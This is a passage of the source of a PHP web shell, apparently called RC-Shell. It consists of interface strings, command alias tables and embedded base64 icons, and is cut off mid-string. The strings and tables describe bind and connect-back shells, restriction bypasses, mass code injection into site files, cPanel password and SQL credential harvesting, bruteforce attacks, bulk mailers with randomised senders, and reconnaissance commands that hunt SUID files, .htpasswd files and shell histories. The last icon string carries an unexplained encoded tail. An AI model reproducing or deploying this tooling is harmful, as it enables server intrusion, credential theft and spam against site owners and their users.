"90"=>"STRING CONVERSIONS",
"91"=>"FUNCTION",
"92"=>"Submit",
"93"=>"CHANGE FILE'S PERMISSIONS:",
"94"=>"Owner",
"95"=>"Group",
"96"=>"World",
"97"=>"Read",
"98"=>"Write",
"99"=>"Execute",
"100"=>"Chmod",
"101"=>"OR ENTER VALUE",
"102"=>"OUTPUT",
"103"=>"CHANGE FILE'S TIMESTAMP",
"104"=>"COPY FROM FILE/DIR",
"105"=>"SET TIME MANUALLY",
"106"=>"Month",
"107"=>"Day",
"108"=>"Year",
"109"=>"Hour",
"110"=>"Min",
"111"=>"Sec",
"112"=>"Change",
"113"=>"Timestamp changed to [%1%]",
"114"=>"Failed to change timestamp",
"115"=>"REPLACE",
"116"=>"WITH",
"117"=>"Replace",
"118"=>"Reset",
"119"=>"Save",
"120"=>"PROGRAM LINE",
"121"=>"Full Hexdump",
"122"=>"Hexdump Preview",
"123"=>"CHANGE DIR'S PERMISSIONS:",
"124"=>"CHANGE DIR'S TIMESTAMP:",
"125"=>"BYPASS RESTRICTIONS - LIST DIR",
"126"=>"DIR TO LIST",
"127"=>"List Dir",
"128"=>"BYPASS RESTRICTIONS - READ FILE",
"129"=>"FILE TO READ",
"130"=>"Read File",
"131"=>"BYPASS RESTRICTIONS - READ FILE VIA SQL",
"132"=>"USERNAME",
"133"=>"PASSWORD",
"134"=>"PORT",
"135"=>"DATABASE",
"136"=>"[-] ERROR! Can't select database",
"137"=>"[-] ERROR! Can't connect to [%1%] server",
"138"=>"BYPASS RESTRICTIONS - WRITE FILE",
"139"=>"FILE TO WRITE",
"140"=>"FILE CONTENT",
"141"=>"Write File",
"142"=>"SEARCH FOR FILES AND DIRS USING PHP",
"143"=>"NAME/FIND/RECURSIVE",
"144"=>"Files",
"145"=>"Dirs",
"146"=>"Both",
"147"=>"Search",
"148"=>"use regexp on name",
"149"=>"SEARCH IN DIR",
"150"=>"FIND TEXT IN FILE",
"151"=>"use regexp on text",
"152"=>"whole words only",
"153"=>"case sensitive",
"154"=>"files not containing the text",
"155"=>"SEARCH TEXT IN FILES USING FIND",
"156"=>"TEXT TO FIND",
"157"=>"FIND IN FILES",
"158"=>"DEFINED/SEARCH IN",
"159"=>"show in file manager",
"160"=>"NOTHING FOUND",
"161"=>"UPLOAD LOCAL FILE",
"162"=>"LOCAL FILE",
"163"=>"OPTIONAL RENAME",
"164"=>"UPLOAD PATH",
"165"=>"FILE LOCATION",
"166"=>"MULTIPLE FILES",
"167"=>"UPLOAD FILE FROM REMOTE URL",
"168"=>"UPLOAD MULTIPLE FILES",
"169"=>"Form",
"170"=>"Upload",
"171"=>"Invalid file location: [%1%]",
"172"=>"Error uploading [%1%] (Can't move [%2%] to [%3%]",
"173"=>"File [%1%] uploaded to [%2%]",
"174"=>"Can't download file!",
"175"=>"Can't write to [%1%]",
"176"=>"File uploaded to [%1%]",
"177"=>"SEND FILE TO E-MAIL",
"178"=>"SEND TO",
"179"=>"Send",
"180"=>"COMMAND",
"181"=>"DEFINED",
"182"=>"EXECUTE PHP CODE",
"183"=>"Execute PHP Code",
"184"=>"Display Result in Textarea",
"185"=>"FTP MANAGER",
"186"=>"HOST:PORT",
"187"=>"USER",
"188"=>"PASS",
"189"=>"Connect",
"190"=>"Passive",
"191"=>"Can't connect",
"192"=>"PHP-SHELL",
"193"=>"FTP",
"194"=>"NEW DIR",
"195"=>"Create",
"196"=>"Disconnect",
"197"=>"Upload",
"198"=>"Download",
"199"=>"Delete",
"200"=>"DOWNLOAD FILE FROM REMOTE FTP",
"201"=>"UPLOAD FILE TO REMOTE FTP",
"202"=>"HOST:PORT",
"203"=>"USER:PASS",
"204"=>"FILE ON FTP",
"205"=>"LOCAL FILE",
"206"=>"Upload File",
"207"=>"Download File",
"208"=>"File uploaded.",
"209"=>"Can't upload file.",
"210"=>"File downloaded.",
"211"=>"Can't download file.",
"212"=>"PHP SIMPLE MAILER",
"213"=>"PHP CSV MAILER",
"214"=>"FROM NAME",
"215"=>"FROM E-MAIL",
"216"=>"E-MAIL SUBJECT",
"217"=>"REPLACE",
"218"=>"WITH",
"219"=>"IN",
"220"=>"E-MAIL COL",
"221"=>"COL PREFIX",
"222"=>"REPLACE IN",
"223"=>"Select Value",
"224"=>"From Name",
"225"=>"From E-mail",
"226"=>"Receiver's E-mail",
"227"=>"Receiver's E-mail - hash",
"228"=>"Subject",
"229"=>"Message",
"230"=>"Subject and Message",
"231"=>"Random \"FROM E-MAIL\" usernames",
"232"=>"Random Message-ID domains",
"233"=>"Send E-mails",
"234"=>"Preview (Don't send)",
"235"=>"Show replaced values",
"236"=>"INCOMPLETE DATA",
"237"=>"NO",
"238"=>"RECEIVER",
"239"=>"SENDER",
"240"=>"MESSAGE-ID",
"241"=>"STATUS",
"242"=>"REPLACING",
"243"=>"Success",
"244"=>"Failed",
"245"=>"Test",
"246"=>"HASH TYPE",
"247"=>"ENTER HASH",
"248"=>"Submit",
"249"=>"Calculate",
"250"=>"Clear Input",
"251"=>"POSSIBLE",
"252"=>"Link",
"253"=>"IP ADDRESS ENCODER",
"254"=>"ENTER IP",
"255"=>"LONG IP",
"256"=>"HEX IP",
"257"=>"OCTAL IP",
"258"=>"SELECT HASH",
"259"=>"ENTER INPUT",
"260"=>"All",
"261"=>"HASH OUTPUT",
"262"=>"STRING CONVERSIONS OUTPUT",
"263"=>"Clear Output",
"264"=>"Send Output to Input",
"265"=>"BIND SHELL",
"266"=>"CONNECT BACK",
"267"=>"PASS:PORT:SRC",
"268"=>"Bind",
"269"=>"Found [%1%] of our backdoor tools in tempdir. Consider deleting tools after using them. ",
"270"=>"Delete Now",
"271"=>"Can't write sources!",
"272"=>"Unknown file!",
"273"=>"Executed. Can't connect to [%1%]!",
"274"=>"OK! Connect to [%1%]:[%2%]!",
"275"=>"Port [%1%] already in use!",
"276"=>"OK! The script is now connecting to [%1%]:[%2%]",
"277"=>"PORTSCAN",
"278"=>"HOST:PORT RANGE",
"279"=>"Scan",
"280"=>"VALID RANGE 0-65535",
"281"=>"PHP-SHELL HUNTER",
"282"=>"ACTION:RECURSIVE",
"283"=>"START PATH",
"284"=>"View known shells only",
"285"=>"View known shells + possible",
"286"=>"Overwrite known shells with RC-Shell",
"287"=>"Overwrite all with RC-Shell",
"288"=>"PHP-SHELL RESULTS",
"289"=>"PORTSCAN RESULT",
"290"=>"Owned",
"291"=>"Can't own it",
"292"=>"FILE NAME",
"293"=>"SHELL TYPE OR VERSION",
"294"=>"EXTERNAL LINK",
"295"=>"FILE ACTIONS / OVERWRITE",
"296"=>"View in Browser",
"297"=>"RC-OVERWRITE",
"298"=>"CPANEL / PASSWORD FINDER",
"299"=>"HOST:USER:SERVICE",
"300"=>"FILES:METHOD:RECURSIVE",
"301"=>"DEFINED PATH",
"302"=>"SEND LOG TO",
"303"=>"Don't login (create passfile)",
"304"=>"user + DEFINED PATH",
"305"=>"user + DOCUMENT ROOT",
"306"=>"/etc/passwd + USER HOMES",
"307"=>"Find Passwords",
"308"=>"CPANEL / PASSWORD FINDER RESULTS",
"309"=>"MASS CODE INJECTOR",
"310"=>"FILES:POS:RECURSIVE",
"311"=>"START IN PATH",
"312"=>"CODE TO INJECT",
"313"=>"Inject Files",
"314"=>"CODE INJECTED IN FILES BELOW",
"315"=>"FIND SQL CREDENTIALS",
"316"=>"USER NAME:TYPE",
"317"=>"PASS NAME:TYPE",
"318"=>"DB NAME:TYPE",
"319"=>"HOST NAME:TYPE",
"320"=>"*SOFTWARE:PASSWORD",
"321"=>"FILES:WHERE:RECURSIVE",
"322"=>"DEFINED PATH",
"323"=>"Find Credentials",
"324"=>"MySQL Test",
"325"=>"DEFINED PATH",
"326"=>"DOCUMENT ROOT",
"327"=>"USER HOMES",
"328"=>"required",
"329"=>"optional",
"330"=>"SQL CREDENTIALS",
"331"=>"HOST",
"332"=>"USER",
"333"=>"PASS",
"334"=>"DATABASE",
"335"=>"ACTION",
"336"=>"MySQL Connect",
"337"=>"BRUTEFORCE / DICTIONARY ATTACK",
"338"=>"HOST:PORT:SERVICE",
"339"=>"USERNAME:DATABASE",
"340"=>"DICTIONARY",
"341"=>"TEST METHOD",
"342"=>"ALSO TEST",
"343"=>"username and dictionary",
"344"=>"/etc/passwd (user:user)",
"345"=>"/etc/passwd and dictionary",
"346"=>"Start Bruteforce",
"347"=>"[%1%] BRUTEFORCE RESULT",
"348"=>"SYSTEM PROCESSES",
"349"=>"SENDING SIGNAL [%1%] TO #[%2%].. ",
"350"=>"KILLED",
"351"=>"CAN'T KILL IT",
"352"=>"Databases",
"353"=>"Query",
"354"=>"Extract E-mails",
"355"=>"Server Status",
"356"=>"Server Variables",
"357"=>"Processes",
"358"=>"Disconnect",
"359"=>"DATABASES",
"360"=>"Database Name",
"361"=>"Size",
"362"=>"Tables",
"363"=>"Database Actions",
"364"=>"DATABASE",
"365"=>"TABLE",
"366"=>"DATABASE [%1%]",
"367"=>"Databases ([%1%])",
"368"=>"Table Name",
"369"=>"Table Actions",
"370"=>"SQL QUERY",
"371"=>"Submit Query",
"372"=>"EXTRACT E-MAILS",
"373"=>"SEARCH TABLES<br>COMMA (,) SEPARATED<br>LEAVE EMPTY FOR ALL",
"374"=>"FILE NAME",
"375"=>"SAVE E-MAILS TO FILE",
"376"=>"DOWNLOAD RESULTS",
"377"=>"Extract E-mails",
"378"=>"SERVER STATUS",
"379"=>"SERVER VARIABLES",
"380"=>"Name",
"381"=>"Value",
"382"=>"PROCESSES",
"383"=>"ID",
"384"=>"USER",
"385"=>"HOST",
"386"=>"DATABASE",
"387"=>"COMMAND",
"388"=>"TIME",
"389"=>"STATE",
"390"=>"INFO",
"391"=>"ACTION",
"392"=>"KILL",
"393"=>"PROCESS #[%1%] KILLED",
"394"=>"QUERY RESULT",
"395"=>"BROWSING TABLE [%1%] ( [%2%] cols and [%3%] rows )",
"396"=>"Previous",
"397"=>"Page",
"398"=>"Go",
"399"=>"Next",
"400"=>"INSERT INTO TABLE [%1%]",
"401"=>"Field",
"402"=>"Type",
"403"=>"Function",
"404"=>"Value",
"405"=>"Insert as new row",
"406"=>"or",
"407"=>"Save",
"408"=>"Confirm",
"409"=>"TOTAL DATABASES [%1%]",
"410"=>"QUICK SQL TABLE DUMP",
"411"=>"SQL TYPE",
"412"=>"HOST:PORT",
"413"=>"USER:PASS",
"414"=>"DB.TABLE",
"415"=>"FILE NAME",
"416"=>"DOWNLOAD RESULTS",
"417"=>"SAVE DUMP TO FILE",
"418"=>"Dump",
"419"=>"Can't connect to SQL server",
"420"=>"QUICK SQL QUERY",
"421"=>"DB",
"422"=>"Query",
"423"=>"QUERY #[%1%] : [%2%]",
"424"=>"NONE",
"425"=>"Chdir",
"426"=>"Total: [%1%]",
"427"=>"Success: [%1%]",
"428"=>"Failed: [%1%]",
"429"=>"Used: [%1%]",
"430"=>"Not Available",
"431"=>"The following e-mails were not sent",
"432"=>"HASH CALCULATOR",
"433"=>"STRING CONVERSIONS",
"434"=>"HOST:PORT:SRC",
"435"=>"Connect",
"436"=>"Find Shells",
"437"=>"DO YOU REALLY WANT TO DROP DATABASE \"[%1%]\" ? ",
"438"=>"DO YOU REALLY WANT TO DROP TABLE \"[%1%]\" ? ",
"439"=>"DO YOU REALLY WANT TO EMPTY TABLE \"[%1%]\" ? ",
"440"=>"SQL DUMP",
"441"=>"DATABASE",
"442"=>"DUMP TABLES<br>COMMA (,) SEPARATED<br>LEAVE EMPTY FOR ALL",
"443"=>"FILE NAME",
"444"=>"SAVE DUMP TO FILE",
"445"=>"DOWNLOAD RESULTS",
"446"=>"Dump",
"447"=>"Can't select database",
"448"=>"Nothing to dump",
"449"=>"Dumped to [%1%]",
"450"=>"Can't write to file.",
"451"=>"SQL MANAGER",
"452"=>"HOST:PORT",
"453"=>"USER",
"454"=>"PASS",
"455"=>"DB",
"456"=>"TYPE",
"457"=>"Connect",
"458"=>"Can't create dump",
"459"=>"Dumped",
"460"=>"SELF REMOVE",
"461"=>"DO YOU REALLY WANT TO DELETE ME? ",
"462"=>"GOOD BYE",
"463"=>"Can't delete [%1%]",
"464"=>"CAN'T LIST [%1%]",
"465"=>"Free: [%1%]",
"466"=>"FILE [%1%] DOESNT EXIST.",
"467"=>"YOU ARE TRYING TO OPEN A DIRECTORY AS A FILE ([%1%])",
"468"=>"TARGET ALREADY EXISTS (DIRECTORY [%1%])",
"469"=>"FILE NOT SPECIFIED",
"470"=>"Return",
"471"=>"Your browser doesnt support iframes.",
"472"=>" (CWD SPECIFIED AS A FILE)",
"473"=>"RENAME [%1%]",
"474"=>"RENAMED TO [%1%]",
"475"=>"CANNOT RENAME [%1%]",
"476"=>"EXTRACTED ZIP ARCHIVE [%1%]",
"477"=>"CANNOT EXTRACT [%1%]",
"478"=>"Extract [%1%]",
"479"=>"GENERAL INFORMATION",
"480"=>"PHP INFORMATION",
"481"=>"OTHER USEFULL STUFF",
"482"=>"Interesting files",
"483"=>"Interesting configs",
"484"=>"Interesting bins",
"485"=>"Scripting languages",
"486"=>"PAGE GENERATED IN [%1%] SECONDS",
"undefined"=>"?",
);

$winaliases=array(
 ''=>'dir',
 '- show open ports'=>'netstat -nat',
 '- running programs'=>'tasklist -v',
 '- running services'=>'net start',
 '- show users'=>'net user',
 '- show computers'=>'net view',
 '- arp table'=>'arp -a',
 '- ip config'=>'ipconfig /all',
 '- mac address'=>'getmac',
 '- systeminfo'=>'systeminfo',
 '- file associations'=>'assoc'
);

$nixaliases=array(
 ''=>'ls -la',
 'console downloaders'=>'which wget GET ftp curl w3m lynx',
 'cpu info'=>'cat /proc/version /proc/cpuinfo',
 'gcc compiler'=>'locate gcc',
 'logged in users'=>'w',
 'active users (from lastlog)'=>'lastlog|grep -v \'\\*\\*\'',
 'last logins (last -a)'=>'last -a',
 'users without password'=>'cut -d: -f1,2,3 /etc/passwd | grep ::',
 'list file attributes'=>'lsattr -va',
 'show open ports (from netstat)'=>'netstat -nat | grep -i listen',
 'active connections (from lsof)'=>'lsof -i',
);

$findaliases=array(
 'find suid files'=>'find %path% -type f -perm -04000 -ls 2>/dev/null',
 'find sgid files'=>'find %path% -type f -perm -02000 -ls 2>/dev/null',
 'find writable dirs'=>'find %path% -perm -2 -type d -ls 2>/dev/null',
 'find writable files'=>'find %path% -perm -2 -type f -ls 2>/dev/null',
 'find writable links'=>'find %path% -perm -2 -type l -ls 2>/dev/null',
 'find writable dirs/files/links'=>'find %path% -perm -2 -ls 2>/dev/null',
 'find config* files'=>'find %path% -type f -name \'config*\'',
 'find config.php files'=>'find %path% -type f -name config.php',
 'find config.inc.php files'=>'find %path% -type f -name config.inc.php',
 'find service.pwd files'=>'find %path% -type f -name service.pwd',
 'find .htpasswd files'=>'find %path% -type f -name .htpasswd',
 'find .bash history'=>'find %path% -type f -name .bash_history',
 'find .mysql history'=>'find %path% -type f -name .mysql_history',
 'find fetchmailrc'=>'find %path% -type f -name .fetchmailrc'
);

$filealiases=array(
 'html'=>array('html','htm','shtml'),
 'text'=>array('html','htm','shtml','css','js','txt','conf','bat','bak','doc','log','sfc','cfg','readme','todo','changelog','makefile','cmake','copying','authors','motd','news','install','about','htaccess'),
 'exe'=>array('sh','bat','cmd','exe','pl','py'),
 'ini'=>array('ini','inf'),
 'code'=>array('php','phtml','php3','php4','php5','pl','cgi','c', 'cc', 'cpp', 'h', 'hpp', 'icl', 'ipp'),
 'img'=>array('gif','png','jpeg','jfif','jpg','jpe','bmp','ico','tif','tiff'),
 'sdb'=>array('sdb'),
 'sess'=>array('sess'),
 'download'=>array('sql','3g2','3ga','3gp','3gpp','669','7z','aac','ac3','ace','aif','aifc','aiff','amr','ape','arj','asf','asx','au','avi','awb','axa','axv','bdm','bdmv','bz','bz2','cab','clpi','com','cpi','doc','dot','divx','dmg','dv','exe','fla','flac','flc','fli','flv','gsm','gz','iso','it','kar','lha','lnk','lzh','m15','m2t','m2ts','m3u','m3u8','m4a','m4b','m4v','med','mid','midi','minipsf','mka','mkv','mng','mo3','mod','moov','mov','movie','mp+','mp2','mp3','mp4','mpc','mpe','mpeg','mpg','mpga','mpl','mpls','mpp','mtm','mts','nrg','nsv','oga','ogg','ogm','ogv','pbk','pif','pla','pls','psf','psflib','psid','qt','qtvr','r00','ra','rar','rax','rv','rvx','s3m','sid','snd','spx','src','stm','swf','tar','tbz','tbz2','tgz','ts','tta','ult','uni','uu','uuf','viv','vivo','vlc','vob','voc','wav','wax','wma','wmv','wmx','wri','wv','xla','xlc','xld','xlsb','xll','xlm','xls','xlt','xlsm','xlw','xltm','wvc','wvp','wvx','xi','xm','xmf','xxe','zip')
);

$execaliases=array(
 'sh %f%'=>array('sh'),
 'perl %f%'=>array('pl','cgi'),
 'python %f%'=>array('py'),
 'php %f%'=>array('php','php3','php4','php5')
);

$getaliases=array(
 'wget'=>'[%1%] [%2%] -O [%3%]',
 'fetch'=>'[%1%] -p [%2%] -o [%3%]',
 'lynx'=>'[%1%] -source [%2%] > [%3%]',
 'links'=>'[%1%] -source [%2%] > [%3%]',
 'GET'=>'[%1%] [%2%] > [%3%]',
 'curl'=>'[%1%] [%2%] -o [%3%]'
);

$index=array(
 "xls"=>array('xla','xlc','xld','xlsb','xll','xlm','xls','xlt','xlsm','xlw','xltm'),
 "pl"=>array("pl","cgi"),
 "diz"=>array("diz","inf"),
 "h"=>array("h","hpp"),
 "iso"=>array("iso","nrg","dmg"),
 "tar"=>array("tar","r00","ace","arj","bz","bz2","tbz","tbz2","tgz","uu","xxe","zip","cab","gz","lha","lzh","pbk","rar","uuf","7z"),
 "php"=>array("php","php3","php4","php5","phtml","shtml"),
 "jpg"=>array("jpg","gif","png","jpeg","jfif","jpe","bmp","ico","tif","tiff"),
 "html"=>array("html","htm","asp","xhtml"),
 "avi"=>array('ogm','mpeg','bdmv','qtvr','ogv','cpi','m2ts','movie','asf','mpls','mkv','avi','rvx','qt','mp2','mp4','divx','mng','axv','rv','mov','moov','mpe','mpl','mpg','ts','nsv','3g2','3ga','mts','m2t','3gp','3gpp','vivo','m4v','flc','bdm','fli','viv','flv','wmv','clpi','vob','dv','ogg'),
 "doc"=>array("doc","dot","wri"),
 "txt"=>array("txt","log","conf","cfg","vbs","ini"),
 "js"=>array("js"),
 "cmd"=>array("cmd","bat","pif","exe","sh","makefile"),
 "wri"=>array("wri","rtf"),
 "swf"=>array("swf","fla"),
 "mp3"=>array('amr','m3u8','med','spx','spx','kar','mpga','pla','it','ape','tta','pls','stm','mid','s3m','asx','mka','awb','psf','aifc','mo3','aiff','mp+','axa','mp2','mp3','ra','mod','wav','wax','mpc','midi','mpp','m15','psid','wv','mtm','xi','xm','m3u','m4b','m4a','aac','ac3','xmf','rax','minipsf','wma','wmx','vlc','ult','669','sid','voc','gsm','au','uni','flac','aif','snd','psflib','wvc','oga','wvp','ogg','wvx'),
 "cpp"=>array("cpp","c","cc","cxx"),
 "css"=>array('css'),
 "htaccess"=>array("htaccess","htpasswd","ht","hta"),
); 

$images=array(
 "ok"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAADoSURBVDiNrZOxboNADIY/08CAunTIQBakSLRbH6Qv0XfrQ/QBmLM1iqIMERnaDqxcJsBdOHQhXJOI/JJ1Z8v32z7boqpMQTDpNTDz2OfA08BmgO8zT1Udkwz4BUoreZ6/qqoMfX0ZAByA0CpJktSXSlgAj45+dAk6ZN1ZAT8A4nThWUQ+Hec94LZoCUhX9huwG2YA8DWWZof1pRJs2jfhrgSVqq6sEobhS13XD1Y3xmziOO597UU8o5yJyDvQExRF8ZGm6ZbTj/XPQRAEx7Zte4IoikYj+QiqpmlKTnfFDKP/V8LVmLyNf9lXY6ltlYsrAAAAAElFTkSuQmCC",
 "cancel"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAHlSURBVDiNpZPPa9NwGMafLkn3HVkDapMsAxEKbbdBmafSi3eZjkXBH8yTMGGwQ4/7CwaDnXqdB0/dFmWhhQqyywZeJJc5ehiYMZAeSlqt0EUy2qavB1sJkSLSF97Lw/t8+PI8fCNEhHFmYiz3CIACIAFADGjiQFP+BZjZy2X17SlWvjCM9MAoXhhGenuKlfdyWR3ATNAQCWSgGPdyeuPzWUHleVbzfXvl9ZvnAFB+9fLgNsclnV7vWrm7mH/28VMJQCMMSBTnU6bWbi1yEeDK7+Oy07MBIBHlkzFuAj4Bdenm2YvzL48BXIYBYsepr1T1+/luw8kCQLvnAwAkngMACIpqZUofClFVKwP4GQYAgNRxnIf20wf5zrffkOFE46qVfPu+EFXVCoD2qBB959Sya543zRiP4NY8b9o5tWwA/qgWxHrFTB9vrBXlvrcwyQQEV+57C8cba8V6xRy281cLiXeZO6X5WDRzgwkAAO6WbAGA/72ZBYAf112cX3WqT6pf9WGIwRe4S1s7+1o85jImQJzVLHn3sCDvHhbEWc1iTIAWj7lLWzv7ANw/LiIK7lz3yNx015dPqNVcJSKJiCRqNVfd9eWT7pG5SURzQU8YACJKEdGjgXmoSQMtFb4P1/jfM/Zv/AXVzv8RqSjGwgAAAABJRU5ErkJggg==",
 "small_home"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1wAADdcBQiibeAAAAAd0SU1FB9oIEwwzMaECujcAAAHfSURBVDjLlZI9a1RREIafc+/Zm4vJLnZqKVY2QREXQcEitikC9jYBBcu0KdPmN0hgsRFsBP+AhsAWpkw2RBAhEgORDexm7545Z8Zio+ayUcwLp5l55jAfrzMz7q69ewM8pa73wNL26mLgH3JnH9iDm9exzE2iCr3DE/qj0yEQL6gz4PX26uJL96LTfdTdP/wwf8NPUZpAbbpaDXrHSe/fuvbYRwnra0t3mCsLLqNBFbK3n76u+6ix/X0w5vPxcAqaaeRYMoLqVG5uxhM1tn2KwkklU8CVwpObQQYuzzkN9VWcVEKKgq9EEakPOlvkODVebe4A8OzhbQqXMQypxlWiZKJGSPr7lUVG5mBjcwcrm1jZZGNzh8xBWWQ1VtTIqqhEhaiTtj3Q2drFyiatsqBVFljZpLO1iz8b7RdfRSVTi0RTcu9oOKPzcZdRNFrnrtIqC0Zxkms4I/eOaIpaJBMRJBqSjKLhWV6YR8J4aqkSxiwvzFM0PJJsUiNCllJCkjEYRXpHQ2LSv94+JqV3NGQwikgyUkp4ESE5q7kM4ODbwYUOPM+KCF5jYBz/BPsh8vzJvQs76IdYYzUGvGjqHh3/aF+dnQNg7yD8l5X7wwGiqeuTjFf2v+ytA20upy6w8hMQ/yfbalvVkgAAAABJRU5ErkJggg==",
 "small_dir"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1wAADdcBQiibeAAAAAd0SU1FB9oIEwwxI2CNqf0AAAEVSURBVDjLpZC9SgNREIXPhkEFU9ippdiLFi4Wgk+QIuBDCJZpU6bdtwg2go3gC9htYepIBLGKQiSBRO/e+bOIjUSEvX7lMOfjzGTujqPe7TWAc/zkDkB70G1F/EH2LfCTvR14I1tODRiOZ5h+fiwAyC85B3A16LYus4t+eVqOxvcHu7SyZQqYr6bNgeFE7Xh/+4yEY9FrH6K5sYY6zENs3Dy8FCQm+eu8wtNkUUvQXCeISU4qjFlg1GUWGCoMCmxgdqQQ2EBsjqiWJGBzUBCDpOURxEDmAvE0g7mAmBksaT9gZpCqgjVNoKrLBpr9o4FJRJV4gkkEsWn5NnnPtzabtcLTxRxsWpJy1Rk9PxYA8poFSgCdLzKTqNoRW0z8AAAAAElFTkSuQmCC",
 "small_unk"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAC0SURBVDiN7Y8tjsMwGESn1kgBAQEGoSELs7fojdpb9FShYd4gh4TmCt+PXVReV4U70sD3NHNZ1/VqZo9Syi8aEkJIJG+XZVnSNE3zOI4IIbwFl1JwnieO4/ijiMwxRohIywDEGJFznunucPcmGABeHM0MtdZmAQCYGaiqHwtUFXT3jwXfufAv+JJAVUGyGTYzBJI5pQQRQa31rYoIUkogmdn3/X3f98e2bT8tC7qu24dhuD8BD6e7SzzK9MwAAAAASUVORK5CYII=",
 "unknown"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAGpSURBVDiNlVLNiuJAGKzEjjkIRomoiCEtsosHFR/AkzJvtPMW81DiUW/ZHCRi/D20IoiiIOlOeg9Lwrhj3N2C79JVX1H10cp0On0TQnxEUdTFf0BVVYcQ8kMZj8cOpbRTqVSgquo/LUdRhP1+j9Vq9ZMEQdAxTRNBECSC7XYLxhiOxyOy2Syq1Sosy0I+n080pmnC87yOGoYhwjCElBJSSvi+j8lkAkVRMBgMoGkaZrMZRqMRrtdroov3VCFE8iilxOFwAADsdjsoioJ6vQ4A4JyDMfagFUKAcM4hpUyiUUpxPp9RKBSQyWRwuVwSrlgsPmg55yBx/BilUgnD4RAAIKUEYwwAUC6XYRjGgzYMQ5C4wjOcTifcbjfUajX0er0vOiHEa4PNZgPbttHtdpNEfxp8OeLnYYyh1Wql8n9N0O/3QQhJ5V8arNdrLBYL2LaNZrOZapBaYblc4n6/w/f9lxVUIQTiv/B5KKXQdR2NRuPpMuf8dwVCiOc4zvd2uw1N05J4lmXBsqyn1+ecw3VdEEI8ksvl3ufz+Yfrut+eFk2BrutzwzDefwHYpG7Wn490BQAAEcJ0RVh0Q29tbWVudAB1bmtub3dulqeSnXGWo6Ogo5CjlqGgo6Wan5hZYVpsO3Gan5qQpJalWVOVmqShnZKqkJajo6CjpFNdUZeSnaSWWmw7l6aflKWaoJ9Ro5RimqOWWVWXWqxRo5alpqOfUXGXlJ2gpJZZcZegoZafWVWXXVFYo1haWlFwUWJRa1FhbFGuO5emn5SlmqCfUaOUYpqoo1lVl1qsUaOWpaajn1Fxl5SdoKSWWXGXoKGWn1lVl11RWJJYWlpRcFFiUWtRYWxRrjuXpp+UpZqgn1GjlGKoo5pZVZddVZRarFFVl6FucZegoZafWVWXXVFYqFhabFFxl6GmpaRZVZehXVFVlFpsUXGXlJ2gpJZZVZehWmxRrjuXpp+UpZqgn1GjlGKXl55ZVaVarFGjlqWmo59RcaSlo5CjlqGdkpSWWVNgYFNdU2BTXXGkpaOQo5ahnZKUlllTjY1TXVNgU11VpVpabFGuO5emn5SlmqCfUaOUYpWVWVqsUaOWpaajn1FZcZappZafpJqgn5CdoJKVlpVZWJSmo51YWlFXV1Fxl6aflKWaoJ+QlqmapKWkWViUpqOdkJqfmqVYWlpRcFFiUWtRYWxRrjuXpp+UpZqgn1GjlGKlnqFZWqw7UZidoJOSnVFVpZaeoZWao2w7UZqXWXGapKSWpVlVpZaeoZWao1pXV3GapJCVmqNZVaWWnqGVmqNaV1dxmqSQqKOapZKTnZZZVaWWnqGVmqNaWlGjlqWmo59RVaWWnqGVmqNsO1GXoKOWkpSZWZKjo5KqWVNgpZ6hYFNdU2CnkqNgpZ6hYFNdU2CmpKNgpZ6hYFNdU2CVlqdgpJmeYFNdU1aIen91eoNgpZaeoWBTWlGSpFFVpVqsO1FRmpdZcZeanZaQlqmapKWkWVWlWldXcZqkkJWao1lVpVpXV3GapJCoo5qlkpOdlllVpVpaUaOWpaajn1FVpWw7Ua47UaOWpaajn1GXkp2klmw7rjuXpp+UpZqgn1GjlGKmo51ZWqw7UVWZUW5RWZaeoaWqWVWQhHaDh3aDjFh5hYWBhFiOWlGtrVGkpaOloJ2gqJajWVWQhHaDh3aDjFh5hYWBhFiOWlFublFYoJeXWFFwUZeSnaSWUWtRpaOmllpsO1FVplFuUViZpaWhWFFfUVlZVZlRcFFYpFhRa1FYWFpRX1FYa2BgWFFfUVWQhHaDh3aDjFh5hYWBkHmAhIVYjlFfUVWQhHaDh3aDjFiBeYGQhHZ9d1iOWmw7UVWeUW5RWZaeoaWqWVWQhHaDh3aDjFiBcoV5kHp/d4BYjlpRcFFYgoZ2g4qQhIWDen94WFFrUViBcoV5kHp/d4BYWmw7UVWkUW5RVZ5Rbm5RWIKGdoOKkISFg3p/eFhRcFFYcFhRa1FYWGw7UaOWpaajn1FVplFfUVWkUV9RWZqkpJalWVWQhHaDh3aDjFWejlpRcFFVkIR2g4d2g4xVno5Ra1FYWFpsO647mpdZo5RilZVZWlpRrDtRl6aflKWaoJ9Ro5RioVlVpl1Vp11VmVqsO1FRmpdZVZlRUm5RU2JTUVdXUVWZUVJuUVNhU1pRVZlRblFTYVNsO1FRVadRblFTlKCfpZafpZClqqGWbp+WqJCVkqWSkJafpaOqV5OSpJaQlKCfpZafpW5TUV9RcaajnZaflKCVlllxk5KklmdlkJaflKCVlllVp1paUV9RU1eZmpWVlp+Qpaqhlm5TUV9RVZlRX1FTV6SqpJClqqGWblNRX1GBeYGQgIRRX1FTV5qhblNRX1FVkIR2g4d2g4xYg3Z+gIV2kHJ1dYNYjmw7UVFVkl